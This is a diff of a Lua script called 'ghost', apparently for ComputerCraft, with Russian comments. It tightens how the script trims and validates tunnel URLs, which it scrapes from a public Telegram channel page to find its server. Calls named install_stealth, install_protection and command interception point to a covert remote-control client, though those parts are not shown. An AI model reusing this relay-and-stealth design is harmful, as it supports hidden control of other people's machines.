@@ -1,4 +1,4 @@
--- ghost v9.9.4 (fixed relay private-check + status code bug)
+-- ghost v9.9.5 (fixed URL format check + trim + debug)
 local URL_FILE = ".server_url"
 local CURRENT_URL = nil
 local TOKEN_FILE = ".token"
@@ -319,7 +319,7 @@ local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") en
 local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end
 
 -- ============================================
--- URL MANAGEMENT (v9.9.4: FIXED private-check)
+-- URL MANAGEMENT (v9.9.5: FIXED format + trim)
 -- ============================================
 local function save_url(url)
     local f = orig_fs_open(URL_FILE, "w")
@@ -340,19 +340,40 @@ local function replace_domain(url, newdomain)
     return scheme .. newdomain .. path
 end
 
+-- НОВОЕ: trim функция
+local function trim(s)
+    if not s then return s end
+    return (s:match("^%s*(.-)%s*$") or s)
+end
+
+-- ИСПРАВЛЕНО: простая проверка URL без regex anchors
 local function is_valid_tunnel_url(url)
     if not url or url == "" then return false end
-    if not url:find("^https://") then return false end
-    if not url:find("%.lhr%.life", 1, true) then return false end
+    url = trim(url)
+    if #url < 20 then
+        glog("is_valid: too short (" .. #url .. "): [" .. url .. "]")
+        return false
+    end
+    if url:sub(1, 8) ~= "https://" then
+        glog("is_valid: no https:// prefix, first 8=[" .. url:sub(1, 8) .. "]")
+        return false
+    end
+    if not url:find(".lhr.life", 1, true) then
+        glog("is_valid: no .lhr.life in url")
+        return false
+    end
     return true
 end
 
 local function validate_url(url)
     if not url or url == "" then return false end
+    url = trim(url)
+    glog("validate: checking URL (len=" .. #url .. "): [" .. url .. "]")
     if not is_valid_tunnel_url(url) then
-        glog("validate: invalid URL format: " .. tostring(url))
+        glog("validate: invalid URL format")
         return false
     end
+    -- Пытаемся /api/health
     local ok, h = pcall(http.get, url .. "/api/health", {
         ["bypass-tunnel-reminder"]="true",
         ["User-Agent"]="ghost-validator"
@@ -369,6 +390,7 @@ local function validate_url(url)
             end
         end
     end
+    -- Fallback: /api/url
     glog("validate: /api/health failed, trying /api/url")
     ok, h = pcall(http.get, url .. "/api/url", {
         ["bypass-tunnel-reminder"]="true",
@@ -401,7 +423,7 @@ local function validate_url(url)
     return true, url
 end
 
--- ИСПРАВЛЕНО: правильная проверка приватности
+-- ИСПРАВЛЕНО: trim + декодируем entities ПЕРЕД парсингом
 local function fetch_relay_urls()
     local url = "https://t.me/s/" .. RELAY_USERNAME
     local ok, h = pcall(http.get, url, {
@@ -419,15 +441,17 @@ local function fetch_relay_urls()
         return {} 
     end
     glog("relay: got " .. #htmlc .. " bytes")
-    -- ПРАВИЛЬНАЯ проверка: ищем посты (tgme_widget_message)
+    -- ПРАВИЛЬНАЯ проверка: есть посты?
     if not htmlc:find("tgme_widget_message", 1, true) then
         glog("relay: no posts found (channel private or empty)")
         return {}
     end
-    htmlc = htmlc:gsub("&lt;", "<"):gsub("&gt;", ">"):gsub("&amp;", "&"):gsub("&quot;", '"'):gsub("&#x27;", "'")
+    -- Декодируем entities ПЕРЕД парсингом
+    htmlc = htmlc:gsub("&lt;", "<"):gsub("&gt;", ">"):gsub("&amp;", "&"):gsub("&quot;", '"'):gsub("&#x27;", "'"):gsub("&nbsp;", " ")
     local urls = {}
     local seen = {}
     for u in htmlc:gmatch("https://[%w%-]+%.lhr%.life") do
+        u = trim(u)  -- ИСПРАВЛЕНО: trim
         if not seen[u] then
             seen[u] = true
             urls[#urls+1] = u
@@ -435,7 +459,7 @@ local function fetch_relay_urls()
     end
     glog("relay: found " .. #urls .. " unique URLs")
     for i, u in ipairs(urls) do
-        glog("relay[" .. i .. "]: " .. u)
+        glog("relay[" .. i .. "]: " .. u .. " (len=" .. #u .. ")")
     end
     return urls
 end
@@ -540,7 +564,7 @@ local function get_valid_url()
         write("URL: ")
         local u = read()
         if u and u ~= "" then
-            u = u:gsub("%s+","")
+            u = trim(u)
             if not u:find("^https?://") then u = "https://" .. u end
             write("Checking... ")
             local ok, result = validate_url(u)
@@ -626,7 +650,7 @@ local function save_mode(m)
 end
 
 -- ============================================
--- HTTP (v9.9.4: FIXED status code)
+-- HTTP (с правильным status code)
 -- ============================================
 local function make_headers(token)
     local h = {}
@@ -636,7 +660,6 @@ local function make_headers(token)
     return h
 end
 
--- ИСПРАВЛЕНО: правильный разбор status code
 local function http_request_with_status(url, body, headers, method)
     local ok, h
     if method == "POST" then
@@ -774,7 +797,7 @@ end
 local function disable_command_intercept() shell.run = orig_shell_run end
 
 -- ============================================
--- REGISTRATION (бесконечная, без cancel-подсказок)
+-- REGISTRATION (бесконечная)
 -- ============================================
 local function register_sync(url, pw)
     if not url or not pw or pw == "" then return nil end
@@ -1024,7 +1047,7 @@ end
 -- MAIN
 -- ============================================
 local function run_main()
-    glog("ghost start v9.9.4")
+    glog("ghost start v9.9.5")
     install_stealth(); install_protection(); install_command_intercept(); load_mode()
     if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
     draw_boot()
